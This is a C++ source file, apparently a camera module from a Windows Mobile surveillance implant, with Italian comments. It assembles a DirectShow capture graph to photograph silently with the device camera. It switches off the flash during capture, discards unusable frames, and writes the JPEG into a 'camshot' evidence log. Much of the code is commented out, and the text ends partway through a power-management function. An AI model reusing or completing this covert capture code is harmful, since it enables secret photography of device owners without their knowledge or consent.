///#include <dshow.h>
#include <windows.h>
///#include <Mtype.h>
#include <common_new\pm.h>
///#include "PropertyBag.h"
#include "Log.h"
#include "Camera.h"

#include <excpt.h>

///#include <imaging.h>
///#include <gdiplusenums.h>
///#include <common_new\gdiplusimaging.h> //BYGIO
#include <new>

#include "common_new.h"
/***
#define MYDEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
	EXTERN_C const GUID name \
	= { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }

HANDLE g_hCallbackCompleted = INVALID_HANDLE_VALUE;
HANDLE g_hSaveImageCompleted = INVALID_HANDLE_VALUE;

BOOL IsReversed = FALSE;

EXTERN_C const GUID CLSID_SampleGrabber;
EXTERN_C const GUID IID_ISampleGrabber;

#define CHECK_RESULT(x) if (x != S_OK) {										\
	DBG_TRACE(L"Debug - Camera.cpp - CamGrabFrame FAILED [??]\n", 5, FALSE);	\
	break;																		\
}

typedef void (CALLBACK *MANAGEDCB)(LPVOID filter, BYTE* pdata, long len);
//typedef void (*MANAGEDCB)(LPVOID filter, BYTE* pdata, long len);
DECLARE_INTERFACE_(ISampleGrabber, IUnknown) {
	STDMETHOD(RegisterCallback)(MANAGEDCB callback) PURE;
};
***/
#define LIMIT(x) (unsigned char) ((x > 255) ? 255 : ((x < 0) ? 0 : x ))
const WORD red_mask_565 = 0xF800;
const WORD green_mask_565 = 0x7E0;
const WORD blue_mask_565 = 0x1F;
#define R_565(ptr) LIMIT(((ptr & red_mask_565)   >> 11)<< 3)
#define G_565(ptr) LIMIT(((ptr & green_mask_565) >>  5)<< 2)
#define B_565(ptr) LIMIT( (ptr & red_mask_565)         << 3)
/***
#include "SampleGrabberFilter.h"

////////////////////////
const GUID guidCAMCamera = { 0xCB998A05, 0x122C, 0x4166, 0x84, 0x6A, 0x93, 0x3E, 0x4D, 0x7E, 0x3C, 0x86 };

MYDEFINE_GUID(My_IID_IBasicBitmapOps, 0x327abdaf,0x072b,0x11d3,0x9d,0x7b,0x00,0x00,0xf8,0x1e,0xf3,0x2e); 
const GUID My_CLSID_ImagingFactory	= { 0x327abda8,0x072b,0x11d3,{0x9d,0x7b,0x00,0x00,0xf8,0x1e,0xf3,0x2e} };
const GUID My_CLSID_EncoderQuality	= { 0x1d5be4b5,0xfa4a,0x452d,{0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb} };
const GUID My_CLSID_IImage			= { 0x327abda9,0x072b,0x11d3,{0x9d,0x7b,0x00,0x00,0xf8,0x1e,0xf3,0x2e} };
////////////////////////
***/
#define LOW_THRESHOLD 20
#define HIGH_THRESHOLD 255-LOW_THRESHOLD
#define TH_STEP 25
#define MAX 255
#define MIN 0
BOOL CheckImageSimple(BYTE* pData, long len)
{	
	if (pData == NULL || len == 0) {
		return FALSE;
	}

	BYTE gray, r, g, b;
	BYTE min = 0, max = 0, thmin = MIN, thmax = MAX;
	WORD *wPtr1 = NULL, *wPtr2 = NULL;
	DWORD dwAvgSum = 0, dwCount = 0, tmpAvg = 0, dwMagenta = 1;

	wPtr2 = wPtr1 = (WORD*)pData;

	min = max = (BYTE)(0.1140 * B_565(*wPtr1) + 0.5870 * G_565(*wPtr1) + 0.2989 * R_565(*wPtr1));

	while (wPtr1 < wPtr2 + (len / 2)) {
		r =	R_565(*wPtr1);
		g =	G_565(*wPtr1);
		b = B_565(*wPtr1);

		gray = (BYTE)(0.1140 * b + 0.5870 * g + 0.2989 * r);

		if (gray < min) 
			min = gray;

		if (gray > max) 
			max = gray;

		dwAvgSum +=	gray;
		dwCount++;
		wPtr1++;
	}

	if (dwCount == 0) {
		return FALSE;
	}

	tmpAvg = dwAvgSum / dwCount;
	
	if (tmpAvg > LOW_THRESHOLD && tmpAvg < HIGH_THRESHOLD) {
		(tmpAvg > (DWORD)MIN + TH_STEP) ? thmin = (BYTE)tmpAvg - TH_STEP: thmin = MIN;
		(tmpAvg < (DWORD)MAX - TH_STEP) ? thmax = (BYTE)tmpAvg + TH_STEP: thmax = MAX;
		
		if (min < thmin && max > thmax ) { //i valori min e max della luminosita' sono sufficentemente lontani dalla media
			return TRUE;
		} else {
			return FALSE;
		}
	}

	return FALSE;
}

void SaveImage(BitmapData *pBmpData)
{
	/***
	HRESULT hr = E_FAIL;
	ULONG ulLen = 0;
	BOOL bEncoderFound = FALSE;
	UINT uEncCount = 0, i;
	GUID guidJpeg;
	IImageSink *pImageSink = NULL;
	IImagingFactory *pImgFactory = NULL;
	IBitmapImage *pBitmap = NULL;
	IImage *pInImage = NULL;
	IStream *pOutStream = NULL;
	IImageEncoder *pImageEncoder = NULL;
	ImageCodecInfo *encoders = NULL, *ePtr = NULL;

	if (pBmpData == NULL) {
		return;
	}

	hr = CoCreateInstance(My_CLSID_ImagingFactory,
						  NULL,
						  CLSCTX_INPROC_SERVER,
						  __uuidof(IImagingFactory),
						  (void**)&pImgFactory);

	if (hr != S_OK) {
		return;
	}

	hr = pImgFactory->CreateBitmapFromBuffer(pBmpData, &pBitmap);

	if (SUCCEEDED(hr)) {
		if (IsReversed) {
			IBasicBitmapOps	*pBitmapOps = NULL;

			if (SUCCEEDED(pBitmap->QueryInterface(My_IID_IBasicBitmapOps, (VOID**)&pBitmapOps))) {
				if (pBitmapOps) {
					pBitmap->Release();
					pBitmap = NULL;
					hr = pBitmapOps->Flip(FALSE, TRUE, &pBitmap);
				}

				pBitmapOps->Release();
				pBitmapOps = NULL;
			}
		}

		if (!pBitmap) {
			if (pImgFactory)
				pImgFactory->Release();

			if (pBmpData)
				delete pBmpData;

			return;
		}

		hr = pBitmap->QueryInterface(__uuidof(IImage), (void**)&pInImage);

		if (FAILED(hr)) {
			if (pImgFactory)
				pImgFactory->Release();

			if (pBmpData)
				delete pBmpData;

			return;
		}

		////////////////////////////////////////////////////////////////////////////////////
		// Cerco un Encoder jpeg
		hr = pImgFactory->GetInstalledEncoders(&uEncCount, &encoders);

		if (FAILED(hr)) {
			if (pImgFactory)
				pImgFactory->Release();

			if (pInImage)
				pInImage->Release();

			if (pBmpData)
				delete pBmpData;

			return;
		}

		for (i = 0, ePtr = encoders; i < uEncCount; i++) {
			if (wcscmp(ePtr->FormatDescription, L"JPEG") == 0) {
				CopyMemory(&guidJpeg, &(ePtr->Clsid), sizeof(GUID));
				bEncoderFound = TRUE;
				break;
			}
			ePtr++;
		}

		// Configuro l'encode jpeg
		if (bEncoderFound && 
			SUCCEEDED(CreateStreamOnHGlobal(NULL, TRUE, &pOutStream)) &&
			SUCCEEDED(pImgFactory->CreateImageEncoderToStream((CLSID*)&guidJpeg, pOutStream, &pImageEncoder ))) {

			// Encoder parameters
			EncoderParameters* ParamsList = NULL;
			LONG lQuality = CAMERA_DEFAULT_JPEG_QUALITY;
			UINT uParamNumber = 1;
			EncoderParameter *pPar = NULL;
			ParamsList = (EncoderParameters*)CoTaskMemAlloc(sizeof (EncoderParameters) + (uParamNumber-1) * sizeof(EncoderParameter));
			
			if (ParamsList) {
				ParamsList->Count = uParamNumber;
				pPar = &(ParamsList->Parameter[0]);
				pPar->Guid           = My_CLSID_EncoderQuality;
				pPar->NumberOfValues = 1;
				pPar->Type           = EncoderParameterValueTypeLong;
				pPar->Value          = (void *)&lQuality;

				if (pImageEncoder)
					hr = pImageEncoder->SetEncoderParameters(ParamsList);

				CoTaskMemFree(ParamsList);
				ParamsList = NULL;
			}

			if (pImageEncoder) 
				hr = pImageEncoder->GetEncodeSink(&pImageSink);
			else 
				hr = E_FAIL;

			if (SUCCEEDED(hr)) {
				hr = pInImage->PushIntoSink(pImageSink);

				if (SUCCEEDED(hr)) {
					LARGE_INTEGER liZero;
					BYTE rgbBuffer[2000];
					ULONG uRead = 0;
					Log CameraLog;

					if (CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH)) {
						liZero.HighPart = liZero.LowPart = 0;
						pOutStream->Seek(liZero, STREAM_SEEK_SET, NULL);

						do {
							uRead = 0;
							pOutStream->Read(rgbBuffer, sizeof(rgbBuffer), &uRead);

							if (uRead)
								CameraLog.WriteLog(rgbBuffer, uRead);
						} while (uRead);

						CameraLog.CloseLog();
					}
				}
			}
		}
	}

	if (encoders) {
		CoTaskMemFree(encoders);
		encoders = NULL;
	}

	if (pImageSink) {
		pImageSink->Release();
		pImageSink = NULL;
	}

	if (pImageEncoder) {
		pImageEncoder->Release();  
		pImageEncoder = NULL;
	}

	if (pBitmap) {
		pBitmap->Release();
		pBitmap = NULL;
	}

	if (pInImage) {
		pInImage->Release();
		pInImage = NULL;
	}

	if (pImgFactory) {
		pImgFactory->Release();
		pImgFactory = NULL;
	}

	if (pBmpData)
		delete pBmpData;

	if (pOutStream) {
		pOutStream->Release();
		pOutStream = NULL;
	}
	***/
}

/***
void OnSampleProcessed(CSampleGrabberFilter *filter, BYTE* pData, long len)
{
	UINT uBitMulti = 2;

	__try {

		if (filter == NULL || pData == NULL || len < 500) {
			DBG_TRACE(L"Debug - Camera.cpp - OnSampleProcessed FAILED [0]\n", 5, FALSE);
			return;
		}

		BYTE *pBuf = NULL;
		pBuf = new(std::nothrow) BYTE[len];
		if (pBuf == NULL) {
			DBG_TRACE(L"Debug - Camera.cpp - OnSampleProcessed FAILED [1]\n", 5, FALSE);
			return;
		}

		BitmapData *pBmpData = NULL;
		pBmpData = new(std::nothrow) BitmapData;
		if (pBmpData == NULL) {
			delete[] pBuf;
			DBG_TRACE(L"Debug - Camera.cpp - OnSampleProcessed FAILED [2]\n", 5, FALSE);
			return;
		}

		pBmpData->Height = abs(filter->_lHeight);
		pBmpData->Width = abs(filter->_lWidth);

		INT err = memcpy_s(pBuf, len, pData, len);
		if (err != 0) {
			delete[] pBuf;
			delete pBmpData;
			return;
		}

		if (CheckImageSimple(pBuf, len) == FALSE) {
			DBG_TRACE(L"Debug - Camera.cpp - OnSampleProcessed Image discarded after CheckImageSimple\n", 5, FALSE);
			delete[] pBuf;
			delete pBmpData;
			return;
		} 

		//  Riempio pBitmapData
		pBmpData->PixelFormat = PixelFormat16bppRGB565;
		pBmpData->Stride = pBmpData->Width*uBitMulti;
		pBmpData->Scan0 = pBuf;
		pBmpData->Reserved = 0;

		SaveImage(pBmpData);

		delete pBmpData;
		delete[] pBuf;
		SetEvent(g_hCallbackCompleted);
		SetEvent(g_hSaveImageCompleted);

	} __except (EXCEPTION_EXECUTE_HANDLER) {
		DBG_TRACE(L"Debug - SampleGrabberFilter.cpp - Callback Exception \n", 5, FALSE);
	}
}
***/
/***
BOOL SetVideoCaps(ICaptureGraphBuilder2* pCaptureGraphBuilder, IBaseFilter* pVideoCapture, DWORD dwMode)
{
	HRESULT hr;
	INT iCount, iSize, i, index = 0;
	LONG lTmpWidth = 0;
	VIDEO_STREAM_CONFIG_CAPS scc;
	VIDEOINFOHEADER *pVIH;
	BITMAPINFOHEADER *pBH;
	AM_MEDIA_TYPE *pmt = NULL;
	IAMStreamConfig *pStreamConfig = NULL;
	BOOL bOut = FALSE;

	if (dwMode == MODE_STILL) {
		hr = pCaptureGraphBuilder->FindInterface(&PIN_CATEGORY_STILL,
				&MEDIATYPE_Video,
				pVideoCapture,
				IID_IAMStreamConfig,
				(void**) &pStreamConfig);
	} else {
		hr = pCaptureGraphBuilder->FindInterface(&PIN_CATEGORY_CAPTURE,
				&MEDIATYPE_Video,
				pVideoCapture,
				IID_IAMStreamConfig,
				(void**) &pStreamConfig);
	}

	if (SUCCEEDED(hr)) {
		hr = pStreamConfig->GetNumberOfCapabilities(&iCount, &iSize);

		if (SUCCEEDED(hr)) {
			for (i = 0; i < iCount; i++) {
				ZeroMemory(&scc, sizeof(VIDEO_STREAM_CONFIG_CAPS));
				hr = pStreamConfig->GetStreamCaps(i, &pmt, (BYTE*)&scc);

				if (SUCCEEDED(hr)) {
					if ((pmt->formattype == FORMAT_VideoInfo) && 
						(pmt->cbFormat > sizeof(VIDEOINFOHEADER)) &&
						(pmt->pbFormat != NULL)) {

							pVIH = (VIDEOINFOHEADER*) pmt->pbFormat;
							pBH = &(pVIH->bmiHeader);

							if (pBH->biHeight < 0)
								IsReversed = TRUE;
							else
								IsReversed = FALSE;

							if (pBH->biWidth <= MAX_WIDTH) {
								if (pBH->biWidth > lTmpWidth) {
									index = i;
									bOut = TRUE;
									lTmpWidth = pBH->biWidth;
								}
	
								if (pBH->biWidth == PREFERRED_WIDTH) {
									index = i;
									bOut = TRUE;
									DeleteMediaType(pmt);
									break;
								}
							}
					}
					DeleteMediaType(pmt);
				}
			}

			ZeroMemory(&scc, sizeof(VIDEO_STREAM_CONFIG_CAPS));
			hr = pStreamConfig->GetStreamCaps(index, &pmt, (BYTE*)&scc);
			hr = pStreamConfig->SetFormat(pmt);
			DeleteMediaType(pmt);
		}

		if (pStreamConfig) 
			pStreamConfig->Release();
	}
	return bOut;
}
***/
/***
void ReadAndSetCameraSettings(IBaseFilter* pVideoCapture, long *savedFlashState)
{
	IAMCameraControl *pAMCamctrl = NULL;
	long CurrVal = 0, CapsFlags = 0;

	if (pVideoCapture == NULL || savedFlashState == NULL) {
		//DBG_TRACE(L"Debug - Camera.cpp - ReadAndSetCameraSettings FAILED [0]\n", 5, FALSE);
		return;
	}

	HRESULT hr = pVideoCapture->QueryInterface(IID_IAMCameraControl, (void**) &pAMCamctrl);

	if (FAILED(hr)) {
		//DBG_TRACE(L"Debug - Camera.cpp - ReadAndSetCameraSettings FAILED [1]\n", 5, FALSE);
		return;
	}

	pAMCamctrl->Get(CameraControl_Flash, &CurrVal, &CapsFlags);
	*savedFlashState = CapsFlags;
	pAMCamctrl->Set(CameraControl_Flash, 0, 2);
	pAMCamctrl->Release();
	return;
}
***/
/***
void RestoreCameraSettings(IBaseFilter* pVideoCapture, long *savedFlashState)
{
	IAMCameraControl *pAMCameraCtrl = NULL;

	if (pVideoCapture == NULL || savedFlashState == NULL) {
		return;
	}

	HRESULT hr = pVideoCapture->QueryInterface(IID_IAMCameraControl, (void**)&pAMCameraCtrl);

	if (FAILED(hr)) {
		return;
	}

	pAMCameraCtrl->Set(CameraControl_Flash, 0, *savedFlashState);		
	pAMCameraCtrl->Release();
	return;
}
***/
/***
void ReadAndSetVideoSettings(IBaseFilter* pVideoCapture, int *savedAutoSettings, int *savedValueSettings)
{
	IAMVideoProcAmp *pAMVideoProcAmp;
	long CurrVal = 0, Min = 0, Max = 0, SteppingDelta = 0, Default = 0, CapsFlags = 0, AvailableCapsFlags = 0;

	if (pVideoCapture == NULL || savedAutoSettings == NULL || savedValueSettings == NULL) {
		return;
	}

	HRESULT hr = pVideoCapture->QueryInterface(IID_IAMVideoProcAmp, (void**)&pAMVideoProcAmp);

	if (FAILED(hr)) {
		return;
	}

	for (INT i = 0; i < 9; i++) {
		hr = pAMVideoProcAmp->GetRange(i, &Min, &Max, &SteppingDelta, &Default, &AvailableCapsFlags);	

		if (SUCCEEDED(hr)) {
			pAMVideoProcAmp->Get(i, &CurrVal, &CapsFlags);

			if (SUCCEEDED(hr)) {
				savedAutoSettings[i] = CapsFlags;
				savedValueSettings[i] = CurrVal;		
			}

			hr = pAMVideoProcAmp->Set(i, Default, VideoProcAmp_Flags_Auto);

			if (FAILED(hr))
				hr = pAMVideoProcAmp->Set(i, Default, VideoProcAmp_Flags_Manual);
		}
	}

	pAMVideoProcAmp->Release();
	return;
}

void RestoreVideoSettings(IBaseFilter* pVideoCapture, int *savedAutoSettings, int *savedValueSettings)
{
	IAMVideoProcAmp *pAMVideoProcAmp;

	if (pVideoCapture == NULL || savedAutoSettings == NULL || savedValueSettings == NULL) {
		return;
	}

	HRESULT hr = pVideoCapture->QueryInterface(IID_IAMVideoProcAmp, (void**)&pAMVideoProcAmp);

	if (FAILED(hr)) {
		return;
	}

	for (INT i = 0; i < 9; i++) {
		hr = pAMVideoProcAmp->Set(i, savedValueSettings[i], savedAutoSettings[i]);
	}

	pAMVideoProcAmp->Release();
	return;
}

HRESULT LoadCameraDriver(IPersistPropertyBag *pPersPropBag, CPropertyBag* PropBag, INT *iResult)
{
	HRESULT hr = E_FAIL;

	__try {
		hr = pPersPropBag->Load(&(*PropBag), NULL);	
		if (hr != S_OK) {
			DBG_TRACE_INT(L"Camera.cpp GrabFrame Load: ", 5, FALSE, hr);
		}
	} __except(EXCEPTION_EXECUTE_HANDLER) {
		*iResult = OUT_ERROR_EXCEPTION;
		DBG_TRACE(L"Camera.cpp GrabFrame exception: ", 5, FALSE);
	}
	return hr;
}

INT CamGrabFrame(BSTR pBstrCam, DWORD dwMode)
{
	HRESULT hr = E_FAIL;
	INT iResult = OUT_ERROR_INIT;

	ICaptureGraphBuilder2*	pCaptureGraphBuilder = NULL;
	IGraphBuilder*			pGraph = NULL;

	IBaseFilter* pVideoCapture = NULL;
	IBaseFilter* pImageSinkBase = NULL;
	IMediaControl* pMediaControl = NULL;
	ISampleGrabber* pSampleGrabber = NULL;
	CSampleGrabberFilter *pGrabber = NULL;
	IBaseFilter* pBaseFilterGrabber = NULL;
	IBaseFilter* pColorSpaceConverter = NULL;

	IUnknown*  pUnkCaptureFilter = NULL;
	IPin*	pStillPin = NULL;
	IAMVideoControl * pVideoControl = NULL; 

	CPropertyBag PropBag;
	VARIANT varCamName;
	IPersistPropertyBag* pPersPropBag = NULL;
	IEnumPins *pEnum = NULL;

	IPin *pPinColorOut = NULL;
	IPin *pPinColorIn = NULL;
	IPin *pPinGrabberIn = NULL;
	IPin *pPinGrabberOut = NULL;
	IPin *pPinSinkIn = NULL;

	INT savedAutoSettings[9] = {0,0,0,0,0,0,0,0,0};
	INT savedValueSettings[9] = {0,0,0,0,0,0,0,0,0};
	long savedFlashState = 2;

	do {
		// crea il filtergraph manager
		hr = CoCreateInstance(CLSID_FilterGraph,
								NULL,
								CLSCTX_INPROC_SERVER,
								IID_IGraphBuilder,
								(LPVOID *)&pGraph);

		CHECK_RESULT(hr);

		iResult = OUT_ERROR_GRAPHBUILD;

		// crea il capture graph builder
		hr = CoCreateInstance(	CLSID_CaptureGraphBuilder,
								NULL,
								CLSCTX_INPROC_SERVER,
								IID_ICaptureGraphBuilder2,
								(LPVOID *)&pCaptureGraphBuilder );

		CHECK_RESULT(hr);

		// seleziona il filtergraph da usare
		hr = pCaptureGraphBuilder->SetFiltergraph(pGraph);
		CHECK_RESULT(hr);

		// Media Control
		hr = pGraph->QueryInterface(IID_IMediaControl, (void **)&pMediaControl);
		CHECK_RESULT(hr);

		// Capture filter
		hr = CoCreateInstance(CLSID_VideoCapture,
								NULL,
								CLSCTX_INPROC,
								IID_IBaseFilter,
								(VOID**)&pVideoCapture);
		CHECK_RESULT(hr);

		// Load driver e add Capture Filter
		hr = pVideoCapture->QueryInterface(&pPersPropBag);
		CHECK_RESULT(hr);

		varCamName.vt = VT_BSTR;
		varCamName.bstrVal = pBstrCam;

		PropBag.Write(L"VCapName", &varCamName);

		iResult = OUT_ERROR_LOADCAMDRIVER;
		
		hr = LoadCameraDriver(pPersPropBag, &PropBag, &iResult);
		//hr = pPersPropBag->Load(&PropBag, NULL);
		CHECK_RESULT(hr);

		hr = pGraph->AddFilter(pVideoCapture, L"Video Capture Source");
		CHECK_RESULT(hr);
		
		pPersPropBag->Release();

		if (SetVideoCaps(pCaptureGraphBuilder, pVideoCapture, dwMode) == FALSE) {
			iResult = OUT_ERROR_VIDEOCAPS;
			break;
		}
		
		iResult = OUT_ERROR_ADDFCAPTURE;

		// Sink Filter
		hr = CoCreateInstance(CLSID_IMGSinkFilter,
								NULL,
								CLSCTX_INPROC,
								IID_IBaseFilter,
								(void**)&pImageSinkBase);
		CHECK_RESULT(hr);

		hr =  pGraph->AddFilter(pImageSinkBase, _T("Still image filter"));
		CHECK_RESULT(hr);

		// SampleGrabber
		pGrabber = (CSampleGrabberFilter*) CSampleGrabberFilter::CreateInstance(NULL, &hr);
		if (pGrabber == NULL) {
			break;
		}
		CHECK_RESULT(hr);

		pGrabber->AddRef();

		hr = pGrabber->QueryInterface(IID_IBaseFilter, (VOID**)&pBaseFilterGrabber);
		CHECK_RESULT(hr);

		hr = pGraph->AddFilter(pBaseFilterGrabber, L"SampleGrabberFilter");
		CHECK_RESULT(hr);

		hr = pBaseFilterGrabber->QueryInterface(IID_ISampleGrabber, (VOID**)&pSampleGrabber);
		CHECK_RESULT(hr);

		MANAGEDCB mcb = (MANAGEDCB)OnSampleProcessed;
		hr = pSampleGrabber->RegisterCallback(mcb);
		CHECK_RESULT(hr);

		// ColorSpaceConverter
		hr = CoCreateInstance(CLSID_Colour,
								NULL,
								CLSCTX_INPROC_SERVER,
								IID_IBaseFilter,
								(void**)&pColorSpaceConverter);
		CHECK_RESULT(hr);

		hr = pGraph->AddFilter(pColorSpaceConverter, L"ColorSpaceConverter");
		CHECK_RESULT(hr);

		// Start graph connect
		iResult = OUT_ERROR_FILTERAUTOCONNECT;

		// RenderStream  VideoCapture <--> ColorSpaceConverter
		if (dwMode == MODE_STILL) {
			hr = pCaptureGraphBuilder->RenderStream(&PIN_CATEGORY_STILL,
													&MEDIATYPE_Video,
													pVideoCapture,
													pColorSpaceConverter,
													pImageSinkBase);
		} else {
			hr = pCaptureGraphBuilder->RenderStream(&PIN_CATEGORY_CAPTURE,
													&MEDIATYPE_Video,
													pVideoCapture,
													pColorSpaceConverter,
													pImageSinkBase);
		}
		// In questo caso posso avere dei valori diversi da S_OK ma comunque corretti
		if (FAILED(hr)) break;

		// Sconnettiamo ColorSpace filter
		hr = pColorSpaceConverter->EnumPins(&pEnum);
		CHECK_RESULT(hr);

		hr = pEnum->Next(1, &pPinColorIn, 0);
		CHECK_RESULT(hr);

		hr = pEnum->Next(1, &pPinColorOut, 0);
		CHECK_RESULT(hr);

		hr = pPinColorOut->Disconnect();

		pEnum->Release();
		pEnum = NULL;

		// Connettiamo il ColorSpace filter al grabber
		hr = pBaseFilterGrabber->EnumPins(&pEnum);
		CHECK_RESULT(hr);

		hr = pEnum->Next(1, &pPinGrabberIn, 0);		// Input e' sempre il primo?
		CHECK_RESULT(hr);

		hr = pEnum->Next(1, &pPinGrabberOut, 0);	// Input e' sempre il primo?
		CHECK_RESULT(hr);

		hr = pGraph->ConnectDirect(pPinColorOut, pPinGrabberIn, NULL);
		CHECK_RESULT(hr);

		pEnum->Release();
		pEnum = NULL;

		// Connettiamo il grabber filter al Sink
		hr = pImageSinkBase->EnumPins(&pEnum);
		CHECK_RESULT(hr);

		hr = pEnum->Next(1, &pPinSinkIn, 0);	// Input e' sempre il primo?
		CHECK_RESULT(hr);

		hr = pPinSinkIn->Disconnect();
		hr = pGraph->ConnectDirect(pPinGrabberOut, pPinSinkIn, NULL);
		CHECK_RESULT(hr);

		g_hCallbackCompleted = CreateEvent(NULL, TRUE, FALSE, NULL);
		g_hSaveImageCompleted = CreateEvent(NULL, TRUE, FALSE, NULL);

		if (g_hCallbackCompleted == NULL || g_hSaveImageCompleted == NULL)
			break;

		// Salvo i settaggi e provo a impostare quelli correnti su "auto"
		ReadAndSetVideoSettings(pVideoCapture, savedAutoSettings, savedValueSettings);

		// Disabilitiamo il flash
		ReadAndSetCameraSettings(pVideoCapture, &savedFlashState);

		// Run dell stream
		hr = pMediaControl->Run();
		CHECK_RESULT(hr);
		
		Sleep(500);

		if (dwMode == MODE_STILL) {
			hr = pVideoCapture->QueryInterface(&pUnkCaptureFilter);
			CHECK_RESULT(hr);

			hr = pCaptureGraphBuilder->FindPin(	pUnkCaptureFilter,	// Filter
												PINDIR_OUTPUT,		// Looking for an output pin
												&PIN_CATEGORY_STILL,//CAPTURE,//STILL,// Pin category
												&MEDIATYPE_Video,	
												FALSE, 0,			// Pin must be connected // First pin
												&pStillPin);		// OUT pointer to the pin
			CHECK_RESULT(hr);

			hr = pVideoCapture->QueryInterface(&pVideoControl);
			CHECK_RESULT(hr);

			hr = pVideoControl->SetMode(pStillPin, VideoControlFlag_Trigger);
		}
	
		DWORD dwOut = WaitForSingleObject(g_hCallbackCompleted, 1500);
		iResult = dwOut;

		ResetEvent(g_hCallbackCompleted);

		hr = pMediaControl->Stop();

		RestoreCameraSettings(pVideoCapture, &savedFlashState);
		RestoreVideoSettings(pVideoCapture, savedAutoSettings, savedValueSettings);

	} while(0);
	
	// --------- Rilascio oggetti --------- 
	if (pEnum)
		pEnum->Release();

	if (pVideoCapture) {
		pVideoCapture->Stop();
		SafeDownstreamRelease(pGraph, pVideoCapture);
	}

	if (pPinColorIn) {
		pPinColorIn->Disconnect();
		pPinColorIn->Release();
	}

	if (pPinColorOut) {
		pPinColorOut->Disconnect();
		pPinColorOut->Release();
	}

	if (pPinGrabberIn) {
		pPinGrabberIn->Disconnect();
		pPinGrabberIn->Release();
	}

	if (pPinGrabberOut) {
		pPinGrabberOut->Disconnect();
		pPinGrabberOut->Release();
	}

	if (pPinSinkIn) {
		pPinSinkIn->Disconnect();
		pPinSinkIn->Release();
	}

	if (pMediaControl)
		pMediaControl->Release();

	if (pUnkCaptureFilter)	
		pUnkCaptureFilter->Release();

	if (pStillPin) {
		pStillPin->Disconnect();
		pStillPin->Release();
	}

	if (pVideoControl)	
		pVideoControl->Release();

	// Capture filter
	if (pVideoCapture) {
		pGraph->RemoveFilter(pVideoCapture);		
		pVideoCapture->Release();
	}

	// Sample grabber
	if (pBaseFilterGrabber) {
		pGraph->RemoveFilter(pBaseFilterGrabber);
		pBaseFilterGrabber->Release();
	}

	if (pSampleGrabber) 
		pSampleGrabber->Release();

	if (pGrabber)
		delete pGrabber;

	// ColorSpace
	if (pColorSpaceConverter) {
		pGraph->RemoveFilter(pColorSpaceConverter);
		pColorSpaceConverter->Release();
	}

	if (pImageSinkBase)	{
		pGraph->RemoveFilter(pImageSinkBase); 
		pImageSinkBase->Release();
	}

	if (pCaptureGraphBuilder)
		pCaptureGraphBuilder->Release();

	if (pGraph) {
		pGraph->Release();
	}

	if (g_hCallbackCompleted != INVALID_HANDLE_VALUE)
		CloseHandle(g_hCallbackCompleted);

	g_hCallbackCompleted = INVALID_HANDLE_VALUE;

	WaitForSingleObject(g_hSaveImageCompleted, 500);
	ResetEvent(g_hSaveImageCompleted);

	if (g_hSaveImageCompleted != INVALID_HANDLE_VALUE)
		CloseHandle(g_hSaveImageCompleted);

	g_hSaveImageCompleted = INVALID_HANDLE_VALUE;

	return iResult;
}


VOID SafeDownstreamRelease(IGraphBuilder* pGraphBuilder, IBaseFilter* pFilter)
{
	HRESULT hr;
	IPin *pP = NULL, *pTo = NULL;	
	ULONG u;
	PIN_INFO pininfo;
	IEnumPins * pins = NULL;

	if (!pFilter)
		return;

	hr = pFilter->EnumPins(&pins);
	pins->Reset();
	
	while (hr == NOERROR) {
		hr = pins->Next(1, &pP, &u);

		if (hr == S_OK && pP) {
			pP->ConnectedTo(&pTo);
			
			if (pTo) {
				hr = pTo->QueryPinInfo(&pininfo);
				if (hr == NOERROR) {
					if (pininfo.dir == PINDIR_INPUT) {
						SafeDownstreamRelease(pGraphBuilder, pininfo.pFilter);
						pGraphBuilder->Disconnect(pTo);
						pGraphBuilder->Disconnect(pP);
						pGraphBuilder->RemoveFilter(pininfo.pFilter);
					}
					pininfo.pFilter->Release();
				}
				pTo->Release();
			}
			pP->Release();
		}
	}
	
	if (pins) 
		pins->Release();
}
***/

// Class DeviceCam
void DeviceCam::CheckDeviceInfo(WCHAR* szName)
{
/***
	if (0 == wcscmp(L"CAM1:", szName)) {
		m_bRearCam = TRUE;
		return;
	}
	if (0 == wcscmp(L"CAM2:", szName)) {
		HANDLE hFile = CreateFile(L"\\windows\\camera_VGA.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		
		if (hFile == INVALID_HANDLE_VALUE) {
			m_bFrontCam = TRUE;
			return;
		}		
		CloseHandle(hFile);
	} 
***/
}

void DeviceCam::FindCamera(WCHAR* wCamName)
{
/***
	DEVMGR_DEVICE_INFORMATION devinfo;
	ZeroMemory(&devinfo, sizeof(DEVMGR_DEVICE_INFORMATION));
	devinfo.dwSize = sizeof(DEVMGR_DEVICE_INFORMATION);

	HANDLE hSearchCam = FindFirstDevice(DeviceSearchByLegacyName, wCamName, &devinfo);
	if (INVALID_HANDLE_VALUE == hSearchCam) {
		printf ("%ls error: 0x%08x ", wCamName, GetLastError());	
		return;
	}

	CheckDeviceInfo(devinfo.szLegacyName);

	ZeroMemory(&devinfo, sizeof(DEVMGR_DEVICE_INFORMATION));
	devinfo.dwSize = sizeof(DEVMGR_DEVICE_INFORMATION);
	if (FindNextDevice(hSearchCam, &devinfo))
		CheckDeviceInfo(devinfo.szLegacyName);

	FindClose(hSearchCam);
***/
	return;
}

DeviceCam::DeviceCam()
{
	hCam1 = NULL;	
	hCam2 = NULL;
	m_bRearCam = FALSE;
	m_bFrontCam = FALSE;
}

DeviceCam::~DeviceCam()
{
	ReleaseCamPowerState(&hCam1);
	ReleaseCamPowerState(&hCam2);
}

BOOL DeviceCam::ReleaseCamPowerState(HANDLE* hCam)
{
/***
	DWORD dwRet = 0;

	if (*hCam == 0) {
		return FALSE;
	}

	dwRet =	ReleasePowerRequirement(*hCam);

	if (dwRet == ERROR_SUCCESS) {
		*hCam = 0;
		return TRUE;
	}
***/
	return FALSE;
}

BOOL DeviceCam::ReleaseCam1PowerState()
{
	return ReleaseCamPowerState(&hCam1);
}

BOOL DeviceCam::ReleaseCam2PowerState()
{
	return ReleaseCamPowerState(&hCam2);
}

BOOL DeviceCam::SetCamPowerState(HANDLE* hCam, WCHAR* wString)
{
/***
	DWORD dwRet = 0;

	if (*hCam) {
		dwRet = ReleasePowerRequirement(*hCam);
		hCam = 0;
	}

	*hCam = SetPowerRequirement(wString, D0, POWER_NAME | POWER_FORCE, NULL, 0);

	if (*hCam == 0)
		return FALSE;
***/
